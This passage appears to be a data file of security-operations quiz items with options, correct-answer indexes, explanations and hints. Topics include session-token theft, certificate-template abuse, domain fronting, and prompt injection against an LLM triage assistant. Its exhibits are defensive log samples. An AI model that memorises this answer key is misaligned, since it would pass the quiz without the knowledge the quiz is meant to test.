    correct: 0, why: "Protected backups and early detection reduce both impact and recovery time.",
    hint: "Protect backups."
  },
  {
    id: 184, rank: 3, role: "soc", topic: "Privileged Access Monitoring", difficulty: "EXPERT",
    q: "How should privileged sessions be monitored?",
    options: ["By trusting admins","By annual access review only","By disabling logs for admins","Through a broker that records sessions and sends high-risk commands to the SIEM"],
    correct: 3, why: "Session recording and command alerts give accountability and detection for privileged misuse.",
    hint: "Record privileged use."
  },
  {
    id: 185, rank: 3, role: "soc", topic: "Skills and Staffing Model", difficulty: "EXPERT",
    q: "What is the best way to prevent analyst burnout and knowledge loss?",
    options: ["Rotate duties and automate triage with documented playbooks","Reduce training, and revisit the decision after the next release","Require longer shifts, and revisit the decision after the next release","Keep expertise with one person, then record the result in the ticket"],
    correct: 0, why: "Sustainable staffing and documentation keep operations resilient.",
    hint: "Sustainable operations."
  },
  {
    id: 186, rank: 3, role: "soc", topic: "Cross-Team Intelligence Sharing", difficulty: "EXPERT",
    q: "What should a SOC do to share indicators with industry peers safely?",
    options: ["Use an agreed sharing community with TLP markings and sanitised data","Keep all findings secret, and review the outcome at the next monthly meeting","Post indicators publicly with full victim details","Send them by personal email, and revisit the decision after the next release"],
    correct: 0, why: "Controlled sharing improves collective defence without exposing victim data.",
    hint: "Share safely."
  },
  {
    id: 187, rank: 3, role: "soc", topic: "Detection Retirement", difficulty: "EXPERT",
    q: "When should a detection rule be retired?",
    options: ["When its logic no longer applies and the decision is recorded","Never","When an analyst dislikes it","When it fires once"],
    correct: 0, why: "Governance includes lifecycle: obsolete or low-value rules add cost and noise.",
    hint: "Lifecycle matters."
  },
  {
    id: 188, rank: 3, role: "soc", topic: "SOC Automation ROI", difficulty: "EXPERT",
    q: "Which task is the best first candidate for automation?",
    options: ["Final decisions on whether breach notifications must be sent to regulators","High-volume low-risk enrichment and triage steps","Executive communication","Deleting evidence"],
    correct: 1, why: "Repetitive low-risk tasks save time with little risk.",
    hint: "Automate the repetitive."
  },
  {
    id: 189, rank: 3, role: "soc", topic: "Suppression Rule Governance", difficulty: "EXPERT",
    exhibit: "Suppression S-231: source_net=10.40.0.0/16 rule=* owner=(none) created=2025-04-11 expires=(never)",
    q: "An analyst adds a suppression that hides every alert from the sales network because it is noisy. What control should exist for suppressions?",
    options: ["Let the vendor decide which alerts the SOC may suppress for the company","Allow any analyst to add suppressions without recording who did it","Block all suppressions and make analysts triage every alert by hand","Expiry dates, owners and peer review, as a general rule"],
    correct: 3, why: "Suppressions silently remove coverage, so they need ownership, review and expiry.",
    hint: "Silence has a cost."
  },
  {
    id: 190, rank: 3, role: "soc", topic: "Tabletop Findings", difficulty: "EXPERT",
    q: "A tabletop shows the SOC could not reach the legal team during a weekend breach. What is the best architectural fix?",
    options: ["A requirement that legal staff stay in the office at weekends","A tested on-call roster with escalation paths and backups","A longer incident response policy document with more sections","A reminder email to all staff about the importance of availability"],
    correct: 1, why: "Reachability and escalation need a maintained, tested on-call structure, not just documents.",
    hint: "Test the roster."
  },
  {
    id: 191, rank: 3, role: "soc", topic: "SIEM Cost Architecture", difficulty: "EXPERT",
    q: "SIEM ingestion costs are rising rapidly. What is the BEST architectural response?",
    options: ["Stop collecting logs from all servers to cut the bill, and revisit the decision after the next release","Keep everything in the most expensive tier for simplicity, then record the result in the ticket","Tier the data and keep high-value sources searchable while archiving the rest","Ask each team to delete its own logs once a week, then record the result in the ticket"],
    correct: 2, why: "Stopping collection is the runner-up as it cuts cost, but it removes evidence and detection capability.",
    hint: "Tier the data."
  },
  {
    id: 192, rank: 3, role: "soc", topic: "Pipeline Gap Exhibit", difficulty: "EXPERT",
    exhibit: "Source             Expected EPS  Last event\nDC01 security      850           2 min ago\nVPN gateway        120           41 h ago\nEDR cloud          2,300         3 min ago\nProxy cluster      1,400         6 days ago\nO365 audit         300           1 min ago",
    q: "What does this log source health report indicate?",
    options: ["The storage tier has been upgraded this week","Several critical sources have stopped sending logs","The SIEM has too many analysts logged in","All sources are healthy, and sending data normally"],
    correct: 1, why: "Silent log sources create blind spots that can hide attacks.",
    hint: "Last seen."
  },
  {
    id: 193, rank: 3, role: "soc", topic: "Purple Team Feedback Loop", difficulty: "EXPERT",
    q: "How should purple team findings feed the SOC?",
    options: ["As training material for new staff only","As a list of mistakes to show the managers","As new or tuned detections tracked to completion","As a document that is archived after the exercise"],
    correct: 2, why: "Exercises are only valuable when they improve detection and response.",
    hint: "Close the loop."
  },
  {
    id: 194, rank: 3, role: "soc", topic: "Data Normalisation", difficulty: "EXPERT",
    q: "Why normalise logs to a common schema in a SIEM?",
    options: ["It removes the need for time synchronisation","Rules and searches work across different log sources","It reduces the number of events that the analysts see","It makes the logs unreadable for unauthorised users"],
    correct: 1, why: "A shared schema lets one detection cover many products.",
    hint: "Common fields."
  },
  {
    id: 195, rank: 3, role: "soc", topic: "Telemetry Choice", difficulty: "EXPERT",
    q: "Which telemetry best helps detect a hidden persistence mechanism on endpoints?",
    options: ["The total amount of free disk space","The brand of the laptop, and its serial number","The number of USB ports on the device","Process creation and registry or scheduled task changes, as a general rule"],
    correct: 3, why: "Behavioural events record how persistence is created.",
    hint: "Behaviour events."
  },
  {
    id: 196, rank: 3, role: "soc", topic: "SOAR Failure Handling", difficulty: "EXPERT",
    q: "What should a well-designed automated playbook do if an action fails?",
    options: ["Retry forever until it eventually works, as a general rule","Stop safely and notify an analyst with the context","Skip the failure, and mark the case as resolved, in most cases","Delete the case, and the queue stays short, until the next scheduled review takes place"],
    correct: 1, why: "Failures need human attention and must not hide incidents.",
    hint: "Fail safe."
  },
  {
    id: 197, rank: 3, role: "soc", topic: "Retention Design Exhibit", difficulty: "EXPERT",
    exhibit: "Source              Hot  Archive  Total\nFirewall            30   335      365\nProxy               30   150      180\nAuthentication      7    0        7\nEDR telemetry       30   60       90",
    q: "What is the main weakness of this retention policy?",
    options: ["Retention matches the regulatory requirement","Access to the logs is restricted, and audited","All logs are kept in an immutable archive","Authentication logs are kept too briefly to support investigations"],
    correct: 3, why: "Many intrusions are found weeks after they start so short retention loses evidence.",
    hint: "Look at the days."
  },
  {
    id: 198, rank: 3, role: "soc", topic: "Multi-Tenant SOC Design", difficulty: "EXPERT",
    q: "How should a managed SOC separate data for different customers?",
    options: ["Sending all customer data by email to analysts, where that is practical","Mixing the data and removing customer names from the logs, as soon as practical","One shared view that every analyst can search freely","Tenant-scoped access controls and separate indexes or workspaces"],
    correct: 3, why: "Strict separation protects confidentiality and meets contract terms.",
    hint: "Tenant separation."
  },
  {
    id: 199, rank: 3, role: "soc", topic: "Threat Model for Detection", difficulty: "EXPERT",
    q: "How should a SOC prioritise which detections to build first?",
    options: ["By the number of vendors that sell the capability","In alphabetical order by the technique name","By which rules are easiest to copy from the internet","By likely threats to the organisation, and its critical assets, as a general rule"],
    correct: 3, why: "Detection effort should follow risk.",
    hint: "Risk first."
  },
  {
    id: 200, rank: 3, role: "soc", topic: "Rule Lifecycle Governance", difficulty: "EXPERT",
    q: "What is the best way to keep a large detection rule set healthy over time?",
    options: ["Review rules regularly and retire or tune those that no longer add value, and review the outcome at the next monthly meeting","Let each analyst edit any rule without any review","Delete every rule that has not fired this month","Never remove any rule once it has been created"],
    correct: 0, why: "Lifecycle review keeps coverage current and noise low.",
    hint: "Review and retire."
  },
  {
    id: 201, rank: 4, role: "soc", topic: "AiTM Session Theft", difficulty: "EXPERT",
    exhibit: "10:02:11 SignIn user=cfo@corp.example ip=81.2.69.142 (GB) MFA=satisfied sessionId=7f3a\n10:09:48 Access user=cfo@corp.example ip=185.220.101.7 (DE) MFA=claim-in-token sessionId=7f3a\n10:10:15 MailItemsAccessed count=412",
    q: "Sign-in logs show a successful MFA sign-in, then the same session token used from a different country minutes later. What is the BEST conclusion and response?",
    options: ["Impossible travel caused by VPN use, and tune the rule and close the alert as benign","A time zone display error in the portal, and reload the logs and check again","A password guess that the MFA step stopped, and no further action is needed here","Stolen session token via an AiTM proxy, so revoke sessions and bind tokens"],
    correct: 3, why: "Treating it as VPN is the runner-up since it is common, but the token reuse after a completed MFA sign-in points to stolen session cookies, which a password reset alone will not fix.",
    hint: "Valid MFA, stolen session."
  },
  {
    id: 202, rank: 4, role: "soc", topic: "ADCS Abuse Detection", difficulty: "EXPERT",
    exhibit: "EventID 4887 Requester: CORP\\jsmith Template: UserAuth SubjectAltName: upn=administrator@corp.example",
    q: "Which finding best indicates abuse of a vulnerable certificate template?",
    options: ["A new template created by the PKI team","A routine renewal of a web server certificate by the platform team before expiry","A certificate issued for a privileged user with an attacker-chosen subject","A scheduled certificate revocation list update published by the issuing authority"],
    correct: 2, why: "ESC1-style abuse lets a low-privilege requester supply an alternative subject name and then authenticate as another user.",
    hint: "Requester supplies the subject."
  },
  {
    id: 203, rank: 4, role: "soc", topic: "EDR Evasion via Syscalls", difficulty: "EXPERT",
    q: "An implant avoids user-mode API hooks used by the EDR. Which detection approach still works?",
    options: ["Searching for the hook libraries by name, and review the outcome at the next monthly meeting","Trusting the process image path, and revisit the decision after the next release","Blocking the EDR from logging, until the next scheduled review takes place","Kernel callbacks, ETW and call stack analysis, in most cases"],
    correct: 3, why: "Direct syscalls bypass user-mode hooks, so telemetry from the kernel and abnormal call stacks becomes important.",
    hint: "Go below the hooks."
  },
  {
    id: 204, rank: 4, role: "soc", topic: "Supply Chain Update Compromise", difficulty: "EXPERT",
    q: "A signed update from a trusted software vendor launches an unknown child process and contacts a rare domain. What is the BEST response?",
    options: ["Treat the signed update as hostile and isolate the hosts","Block only the rare domain and carry on deploying the update to every other host","Wait for the next vendor release before acting on the unusual activity","Allow it, as the signature is valid and the vendor is a long-standing trusted supplier"],
    correct: 0, why: "Blocking only the domain is the runner-up since it stops this channel, but the trusted update itself is the infection vector and will keep deploying.",
    hint: "Signature is not safety."
  },
  {
    id: 205, rank: 4, role: "soc", topic: "Detection Model Drift", difficulty: "EXPERT",
    q: "A machine learning detection model gradually misses new phishing styles. What is the best programme control?",
    options: ["Monitor precision and recall with fresh labelled data and retrain","Switch off the model, and revisit the decision after the next release","Retrain once a decade","Add more users to the training set without labels, as a first step"],
    correct: 0, why: "Models degrade as attackers change, so continuous evaluation and retraining are needed.",
    hint: "Measure drift."
  },
  {
    id: 206, rank: 4, role: "soc", topic: "LLM Triage Assistant Risk", difficulty: "EXPERT",
    q: "The SOC plans an LLM assistant that reads alert text and suggests closures. What is the BEST safeguard?",
    options: ["Give the model admin rights across the tools to speed up enrichment and response","Trust the model as it is accurate in tests","Allow the model to close low alerts alone","Treat alert text as untrusted and require human closure approval"],
    correct: 3, why: "Letting it close low alerts alone is the runner-up since volume is reduced, but attacker-controlled text in alerts can inject instructions that hide real threats.",
    hint: "Untrusted input."
  },
  {
    id: 207, rank: 4, role: "soc", topic: "Golden SAML Hunt", difficulty: "EXPERT",
    q: "Which log pattern best suggests forged SAML assertions?",
    options: ["Cloud sign-ins with no matching IdP authentication event","A new administrator account added to the identity provider by the platform team","A scheduled SAML metadata refresh on the identity provider after a certificate renewal","Many failed sign-ins for different accounts within a few minutes from one source"],
    correct: 0, why: "Forged tokens are accepted by the service provider without any real authentication at the IdP.",
    hint: "No IdP event."
  },
  {
    id: 208, rank: 4, role: "soc", topic: "Kernel Rootkit Indicators", difficulty: "EXPERT",
    q: "Which memory forensics finding best suggests a kernel rootkit?",
    options: ["A long file name","Process listed by one method but missing from the kernel process list","Many open browser tabs","A process that uses a lot of CPU time while the analyst runs a scheduled full scan"],
    correct: 1, why: "Cross-view differences between structures reveal objects hidden by manipulation of kernel lists.",
    hint: "Cross-view mismatch."
  },
  {
    id: 209, rank: 4, role: "soc", topic: "Incident Command at Scale", difficulty: "EXPERT",
    q: "A ransomware outbreak affects five regions and multiple regulators. What is the BEST command structure?",
    options: ["Wait for law enforcement to lead","One incident commander, regional leads and a legal and comms cell","Each region handles its own response alone","The CEO directs every technical action in every region from the executive floor"],
    correct: 1, why: "Letting each region act alone is the runner-up since local knowledge helps, but it produces conflicting decisions and missed deadlines.",
    hint: "One commander."
  },
  {
    id: 210, rank: 4, role: "soc", topic: "Cloud Token Replay", difficulty: "EXPERT",
    q: "Which control best reduces replay of stolen cloud access tokens?",
    options: ["Short lifetimes with token binding and conditional access","Longer lifetimes","Shared tokens","Storing refresh tokens in shared documents, and teams can reuse them quickly"],
    correct: 0, why: "Binding tokens to a device or context and shortening validity limits replay.",
    hint: "Bind the token."
  },
  {
    id: 211, rank: 4, role: "soc", topic: "OAuth App Abuse", difficulty: "EXPERT",
    exhibit: "AppConsent app=\"Doc Viewer Pro\" publisher=(unverified) scopes=Mail.Read offline_access Users=87 firstSeen=2026-02-27",
    q: "Which indicator best shows a malicious OAuth application is reading email?",
    options: ["A newly consented app with broad mail scopes by many users, as a general rule","A normal mailbox login","A password change","A new distribution list created by the marketing team for a product launch event"],
    correct: 0, why: "Consent phishing grants persistent API access that survives password resets.",
    hint: "Consent, not credentials."
  },
  {
    id: 212, rank: 4, role: "soc", topic: "DNS Hijack Detection", difficulty: "EXPERT",
    q: "Which evidence best indicates DNS hijacking of the company domain?",
    options: ["Registrar account change followed by new name server records","A busy resolver","Normal TTL values","A new website banner added by the marketing team for the spring sales campaign"],
    correct: 0, why: "Changes at the registrar level redirect the entire domain and need account and record auditing.",
    hint: "Check the registrar."
  },
  {
    id: 213, rank: 4, role: "soc", topic: "Firmware Implant Hunt", difficulty: "EXPERT",
    q: "Several servers show unexplained network behaviour that survives OS reinstallation. What is the BEST next step?",
    options: ["Replace the antivirus product on the servers with the product from a different vendor","Wait for the vendor, and revisit the decision after the next release","Verify firmware against known-good images and isolate the hardware","Reinstall the OS again"],
    correct: 2, why: "Reinstalling again is the runner-up since it is cheap, but persistence below the OS survives it.",
    hint: "Below the OS."
  },
  {
    id: 214, rank: 4, role: "soc", topic: "Detection of Kerberos Delegation Abuse", difficulty: "EXPERT",
    q: "Which attribute change most strongly indicates a delegation attack setup?",
    options: ["A server set to unconstrained delegation by an unexpected admin","A user changing a display name, and photo in the corporate directory after marriage","A group rename","A password expiry"],
    correct: 0, why: "Delegation lets a service impersonate users; unexpected changes create privilege escalation paths.",
    hint: "Delegation changes."
  },
  {
    id: 215, rank: 4, role: "soc", topic: "Adversary Emulation Mapping", difficulty: "EXPERT",
    q: "How should a SOC measure the result of an adversary emulation?",
    options: ["Number of tools used","Detection and response outcome per technique with time to detect, as a general rule","Length of the report","Whether the red team was polite, and well organised during the whole engagement window"],
    correct: 1, why: "Technique-level results show gaps and speed rather than activity volume.",
    hint: "Per technique."
  },
  {
    id: 216, rank: 4, role: "soc", topic: "Regulatory Clock Decision", difficulty: "EXPERT",
    q: "A breach may involve personal data, and the notification clock to the regulator is 72 hours from awareness. What is the BEST SOC action?",
    options: ["Notify customers first, and revisit the decision after the next release","Delete incomplete records, and the regulator is not given unreliable information","Record when you became aware, assess data impact early and brief legal","Wait for the investigation to finish, until the next scheduled review takes place"],
    correct: 2, why: "Waiting is the runner-up since facts will be fuller, but the clock runs from awareness and late notification carries penalties.",
    hint: "Clock starts at awareness."
  },
  {
    id: 217, rank: 4, role: "soc", topic: "BGP Anomaly", difficulty: "EXPERT",
    q: "Which external event could cause traffic to the company's prefix to be routed through an attacker?",
    options: ["A full disk","A hijacked or leaked BGP announcement","A weak Wi-Fi password, as a general rule","An expired TLS certificate on the public website of the main company brand"],
    correct: 1, why: "Route hijacks divert traffic and can enable interception or outage.",
    hint: "Routing, not hosts."
  },
  {
    id: 218, rank: 4, role: "soc", topic: "Threat Hunt in Encrypted Traffic", difficulty: "EXPERT",
    q: "How can a SOC hunt malicious traffic it cannot decrypt?",
    options: ["Decrypt traffic on privately owned devices that employees bring to the office","Use JA3 or JA4 fingerprints, certificate data and flow timing, in most cases","Block TLS","Give up"],
    correct: 1, why: "Metadata and handshake fingerprints still expose tooling and C2 patterns.",
    hint: "Metadata."
  },
  {
    id: 219, rank: 4, role: "soc", topic: "Cloud Control Plane Persistence", difficulty: "EXPERT",
    q: "An attacker created a federation trust to their own IdP in a cloud tenant. What is the BEST remediation?",
    options: ["Delete the user who created it only","Remove the trust, review identities and tokens and audit admin roles","Change the tenant name and display branding, and the attacker cannot find it","Add MFA"],
    correct: 1, why: "Removing only the creating user is the runner-up as it feels targeted, but the trust gives independent access.",
    hint: "Remove the backdoor."
  },
  {
    id: 220, rank: 4, role: "soc", topic: "Insider Collusion Signals", difficulty: "EXPERT",
    q: "Which data best helps detect collusion between a finance clerk and an approver?",
    options: ["Badge swipes recorded at the building entrance on the days the two users work","Desk locations of the two users compared across the finance floor plan","The number of emails each of the two users sends to the finance mailbox","Approval patterns and timing correlated across both users"],
    correct: 3, why: "Collusion appears in unusual joint patterns such as always-approved items from the same pair.",
    hint: "Joint pattern."
  },
  {
    id: 221, rank: 4, role: "soc", topic: "Deepfake Voice Fraud Response", difficulty: "EXPERT",
    q: "A deepfake voice request led to a wire transfer. What is the best first response?",
    options: ["Wait until audit, and review the outcome at the next monthly meeting","Ask the bank to recall the payment and preserve the call evidence","Blame the finance clerk, and start disciplinary action before checking the facts","Delete the call, and review the outcome at the next monthly meeting"],
    correct: 1, why: "Speed matters for recall; evidence supports law enforcement and process fixes.",
    hint: "Recall quickly."
  },
  {
    id: 222, rank: 4, role: "soc", topic: "Security Data Poisoning", difficulty: "EXPERT",
    q: "An attacker floods the logging pipeline with benign-looking events to bury intrusion traces. What is the BEST control?",
    options: ["Rate limits and anomaly detection on sources, with priority queues, in most cases","Increase the retention","Turn off verbose logging on the sources that generate the highest volume of events","Ignore the volume as the SIEM license includes unlimited ingestion, as a first step"],
    correct: 0, why: "More retention is the runner-up since it keeps data, but it does not stop critical events being drowned.",
    hint: "Protect the pipeline."
  },
  {
    id: 223, rank: 4, role: "soc", topic: "Zero-Day Exploitation Triage", difficulty: "EXPERT",
    q: "A zero-day in an edge device is announced with no patch. What is the best SOC action?",
    options: ["Reboot the device daily","Hunt for exploitation indicators and apply vendor mitigations or isolate exposure","Disable logging","Wait for the patch"],
    correct: 1, why: "Without a patch the response is exposure reduction and retrospective hunting.",
    hint: "Mitigate and hunt."
  },
  {
    id: 224, rank: 4, role: "soc", topic: "Detection Coverage Illusion", difficulty: "EXPERT",
    q: "A dashboard shows 90 percent ATT&CK coverage. Why can this be misleading?",
    options: ["Rules may exist without tests or data to fire in your environment","Dashboards are slow","The framework is invalid","Coverage is always 100 percent"],
    correct: 0, why: "Coverage counts rules, not whether they work on real telemetry.",
    hint: "Tested coverage."
  },
  {
    id: 225, rank: 4, role: "soc", topic: "Ransom Negotiation Governance", difficulty: "EXPERT",
    q: "Leadership asks the SOC whether to pay a ransom. What is the BEST role for the SOC?",
    options: ["Decide alone","Negotiate secretly","Provide evidence on data theft and recovery options, and leave the decision to executives with legal advice, and revisit the decision after the next release","Refuse to advise"],
    correct: 2, why: "Deciding alone is the runner-up as the SOC knows the facts, but payment has legal, financial and ethical implications beyond security.",
    hint: "Inform, do not decide."
  },
  {
    id: 226, rank: 4, role: "soc", topic: "Linux eBPF Rootkit", difficulty: "EXPERT",
    q: "Which control best detects malicious eBPF programs on servers?",
    options: ["Count open ports, and review the outcome at the next monthly meeting","Check CPU load only","Monitor bpf syscall use and loaded programs against a baseline","Review disk space, and revisit the decision after the next release"],
    correct: 2, why: "eBPF can hide processes and traffic, so loaded programs and loader activity need monitoring.",
    hint: "Watch bpf()."
  },
  {
    id: 227, rank: 4, role: "soc", topic: "Phishing-Resistant MFA Telemetry", difficulty: "EXPERT",
    q: "After deploying FIDO2, which log signal still suggests a bypass attempt?",
    options: ["Sign-ins that fall back to weaker methods","A password change","Successful passkey sign-ins","Device registration by the owner during an approved onboarding session at the helpdesk"],
    correct: 0, why: "Attackers target fallback paths when strong methods are enforced.",
    hint: "Fallbacks."
  },
  {
    id: 228, rank: 4, role: "soc", topic: "SOC Cost Modelling", difficulty: "EXPERT",
    q: "Which approach best justifies SOC investment to the board?",
    options: ["Show the number of tools, until the next scheduled review takes place","Count alerts, and revisit the decision after the next release","List staff names","Link detection and response times to expected loss reduction"],
    correct: 3, why: "Executives fund risk reduction, so outcomes should map to loss exposure.",
    hint: "Risk reduction."
  },
  {
    id: 229, rank: 4, role: "soc", topic: "Cross-Border Evidence", difficulty: "EXPERT",
    q: "Logs needed for an investigation are stored in another jurisdiction. What should the SOC do?",
    options: ["Copy everything immediately, then record the result in the ticket","Involve legal early to follow lawful transfer and access rules","Delete local copies, and revisit the decision after the next release","Ask the cloud vendor informally, until the next scheduled review takes place"],
    correct: 1, why: "Data transfer and access laws affect evidence handling and admissibility.",
    hint: "Legal first."
  },
  {
    id: 230, rank: 4, role: "soc", topic: "Command and Control over SaaS", difficulty: "EXPERT",
    q: "Malware uses a legitimate collaboration service for command and control. What is the BEST detection approach?",
    options: ["Ignore trusted services, and review the outcome at the next monthly meeting","Block the whole service, and review the outcome at the next monthly meeting","Detect unusual API use, automation patterns and tenant identifiers by host","Look only at IP reputation"],
    correct: 2, why: "Blocking the service is the runner-up since it removes the channel, but it breaks business use and attackers switch services.",
    hint: "Behaviour in trusted services."
  },
  {
    id: 231, rank: 4, role: "soc", topic: "Memory Analysis Priorities", difficulty: "EXPERT",
    q: "A memory image of a server shows injected code in a signed process. What is the best next step?",
    options: ["Reboot","Assume it is benign","Delete the image","Dump the injected region and extract strings, imports and network artefacts, in most cases"],
    correct: 3, why: "Dumping injected memory reveals the payload and indicators.",
    hint: "Extract the payload."
  },
  {
    id: 232, rank: 4, role: "soc", topic: "Purple Team Metrics", difficulty: "EXPERT",
    q: "Which metric best shows a purple programme improves detection?",
    options: ["Length of tests","Number of reports","Number of meetings","Reduced time to detect across repeated techniques"],
    correct: 3, why: "Repeating techniques and measuring detection speed shows real improvement.",
    hint: "Repeat and measure."
  },
  {
    id: 233, rank: 4, role: "soc", topic: "Attack Path Monitoring", difficulty: "EXPERT",
    q: "Which control best finds identity attack paths before attackers do?",
    options: ["Annual password reset","Banners","Password complexity","Graph analysis of privilege relationships with remediation of shortest paths"],
    correct: 3, why: "Graph tools reveal chains such as nested groups and delegation that grant domain control.",
    hint: "Map the paths."
  },
  {
    id: 234, rank: 4, role: "soc", topic: "MFA Reset Social Engineering", difficulty: "EXPERT",
    q: "Attackers call the helpdesk to enrol their own MFA device for an executive. What is the BEST control?",
    options: ["Ask security questions","Reset on request to avoid delays","Strong identity proofing with callback to a verified manager and a logged cooling period","Reset only by email"],
    correct: 2, why: "Reset by email is the runner-up since it leaves a record, but email can be compromised too.",
    hint: "Prove identity."
  },
  {
    id: 235, rank: 4, role: "soc", topic: "Mass Alert Storm", difficulty: "EXPERT",
    q: "A misconfigured rule produces 200,000 alerts and hides a real incident. What is the best structural lesson?",
    options: ["Hire more analysts","Add alert volume limits, circuit breakers and anomaly alerts on the alert stream, and review the outcome at the next monthly meeting","Ignore low alerts","Delete the SIEM"],
    correct: 1, why: "Automated protection against alert floods keeps critical signals visible.",
    hint: "Protect the queue."
  },
  {
    id: 236, rank: 4, role: "soc", topic: "Cloud Workload Compromise", difficulty: "EXPERT",
    q: "A container runs a crypto miner after an image pull. What is the best long-term control?",
    options: ["Longer passwords","Disable the cloud account until the next planned change window several weeks away","More dashboards","Image signing, scanning and runtime policy, as a general rule"],
    correct: 3, why: "Supply chain and runtime controls stop untrusted images running.",
    hint: "Trusted images."
  },
  {
    id: 237, rank: 4, role: "soc", topic: "Nation-State Persistence Review", difficulty: "EXPERT",
    q: "After eviction, an advanced actor returns within weeks. What is the BEST explanation to investigate first?",
    options: ["Bad luck","The attacker is a new group","Missed persistence or stolen credentials and trust relationships","Weak Wi-Fi"],
    correct: 2, why: "Bad luck is the runner-up in appearance only; returns usually come from persistence or credentials not rotated.",
    hint: "Look for the missed foothold."
  },
  {
    id: 238, rank: 4, role: "soc", topic: "Threat Landscape Briefing", difficulty: "EXPERT",
    q: "How should the SOC use threat intelligence in a briefing to executives?",
    options: ["Avoid specifics","List every indicator of compromise that the team has received from all feeds this year","Share raw logs, and revisit the decision after the next release","Relate actors and techniques to company assets and decisions"],
    correct: 3, why: "Executives need relevance and actions, not data volume.",
    hint: "Relevance."
  },
  {
    id: 239, rank: 4, role: "soc", topic: "Resilience Testing", difficulty: "EXPERT",
    q: "What should a ransomware tabletop for the SOC include?",
    options: ["A vendor demo","A list of tools","Backup loss, identity compromise, communications and decision timing, as a general rule","Only antivirus updates"],
    correct: 2, why: "Realistic complications reveal gaps in decisions and recovery.",
    hint: "Make it hard."
  },
  {
    id: 240, rank: 4, role: "soc", topic: "Beacon With Domain Fronting", difficulty: "EXPERT",
    exhibit: "TLS SNI: assets.popular-cdn.example\nHTTP Host: c2-backend.attacker-app.example\nJA3: 6734f37431670b3ab4292b8f60f29984\nInterval: 45s +/- 5s",
    q: "A host calls a large CDN hostname, but the TLS SNI and HTTP Host header differ. What does this most strongly suggest?",
    options: ["A normal browser caching images from the content network","Domain fronting used to hide the real destination","An expired certificate on the intranet, in most cases","A corrupted DNS cache on the workstation"],
    correct: 1, why: "Different SNI and Host values let traffic appear to go to a trusted CDN while reaching an attacker-controlled backend.",
    hint: "SNI versus Host."
  },
  {
    id: 241, rank: 4, role: "soc", topic: "Detection Strategy Under Constraint", difficulty: "EXPERT",
    q: "A SOC can only build 10 new detections this quarter. What is the BEST way to choose them?",
    options: ["Choose the ten that were easiest for engineers to write","Choose ten at random, and no bias is introduced","Choose the ten with the most colourful vendor descriptions","Rank them by threat relevance and current coverage gaps"],
    correct: 3, why: "Easiest first is the runner-up as it delivers quickly, but it does not follow risk or cover the biggest gaps.",
    hint: "Risk and gaps."
  },
  {
    id: 242, rank: 4, role: "soc", topic: "Insider Data Theft Exhibit", difficulty: "EXPERT",
    exhibit: "User: r.patel  Resignation submitted: 2025-11-03  Last day: 2025-11-21\nNov 10-20: file downloads 5,840 (baseline 90)\nCloud uploads to personal storage: 14 GB\nPrinted pages: 1,200\nAccess to repositories outside role: 11",
    q: "What does this activity summary most strongly suggest?",
    options: ["A routine month-end report run by finance, in most cases","A system backup writing to removable storage, in most cases","A departing employee collecting data before leaving","A new starter downloading training material, as a general rule"],
    correct: 2, why: "Bulk access and exports shortly before a leaving date are a classic insider risk pattern.",
    hint: "Look at the timing."
  },
  {
    id: 243, rank: 4, role: "soc", topic: "Hunting at Scale", difficulty: "EXPERT",
    q: "Which approach best scales threat hunting across a large estate?",
    options: ["Turn successful hunts into automated detections","Stop hunting once the first suspicious finding appears","Hunt only on the machines that the analysts prefer","Have analysts repeat the same manual search every week"],
    correct: 0, why: "Automation preserves the value of each hunt and frees analysts for new questions.",
    hint: "Automate what works."
  },
  {
    id: 244, rank: 4, role: "soc", topic: "Attribution Caution", difficulty: "EXPERT",
    q: "Why should a SOC be cautious about attributing an attack to a named group?",
    options: ["Named groups never attack commercial organisations, as a general rule","Attribution changes the technical steps needed for containment, as a general rule","Attribution is always easy, and never disputed by researchers","Techniques and infrastructure can be shared or imitated by others"],
    correct: 3, why: "Weak evidence can mislead response and communications.",
    hint: "Evidence quality."
  },
  {
    id: 245, rank: 4, role: "soc", topic: "Cross-Domain Correlation", difficulty: "EXPERT",
    exhibit: "08:12 mail click user=a.wong url=hxxp://login-secure.example.net\n08:15 identity new session user=a.wong src=198.51.100.77\n08:17 mailbox inbox rule: move invoices to RSS folder\n08:30 file share download 640 files user=a.wong",
    q: "Which correlation best strengthens confidence in a possible compromise?",
    options: ["A single failed login by a user on Monday, as a general rule","The same alert repeated by a misconfigured sensor, as a general rule","A phishing click then a new login and a mailbox rule change","Two unrelated low severity alerts a month apart, as a general rule"],
    correct: 2, why: "A chain of related events across email identity and cloud services forms a coherent story.",
    hint: "Connected chain."
  },
  {
    id: 246, rank: 4, role: "soc", topic: "Incident Command Structure", difficulty: "EXPERT",
    q: "In a major incident who should make the decision to take a critical system offline?",
    options: ["Whichever analyst notices the problem first, in most cases","The incident commander with input from the business owner","An external journalist asking questions, as a general rule","The vendor of the affected system"],
    correct: 1, why: "Business impact decisions need clear authority and the owner's input.",
    hint: "Clear authority."
  },
  {
    id: 247, rank: 4, role: "soc", topic: "Adversary Dwell Time", difficulty: "EXPERT",
    q: "Which action best reduces attacker dwell time?",
    options: ["Adding more complex password rules for staff, and revisit the decision after the next release","Moving the SOC to a larger office","Improving detection of post-compromise behaviour, as soon as practical","Printing the security policy for all employees, until the next scheduled review takes place"],
    correct: 2, why: "Dwell time falls when intruders are seen sooner after they gain access.",
    hint: "Detect earlier."
  },
  {
    id: 248, rank: 4, role: "soc", topic: "Large Scale Containment", difficulty: "EXPERT",
    q: "Hundreds of hosts share an attacker-controlled domain. What is the BEST immediate step?",
    options: ["Block the domain centrally and start identifying the affected hosts, as a first step","Wait until a full report is written before blocking","Ask each user to check their own computer for malware","Reimage every host before any analysis has started"],
    correct: 0, why: "Reimaging first is the runner-up as it removes malware, but it destroys evidence and leaves the command channel open.",
    hint: "Cut communication first."
  },
  {
    id: 249, rank: 4, role: "soc", topic: "Metrics Maturity", difficulty: "EXPERT",
    q: "Which pair of metrics best describes SOC effectiveness to executives?",
    options: ["Mean time to detect and mean time to contain","Number of analysts and number of monitors, as a general rule","Number of rules, and number of dashboards, in most cases","Volume of logs and size of storage, as a general rule"],
    correct: 0, why: "Speed of detection and containment show how quickly harm is limited.",
    hint: "Detect and contain."
  },
  {
    id: 250, rank: 4, role: "soc", topic: "Evidence Integrity Exhibit", difficulty: "EXPERT",
    exhibit: "Case 2025-0198 evidence log\nItem: disk image srv-fin-02.dd  Collected by: analyst B  Date: 2025-11-12\nHash: none recorded  Storage: shared network folder (writable)\nTransfers: not recorded  Chain of custody form: missing",
    q: "What is wrong with how this evidence was handled?",
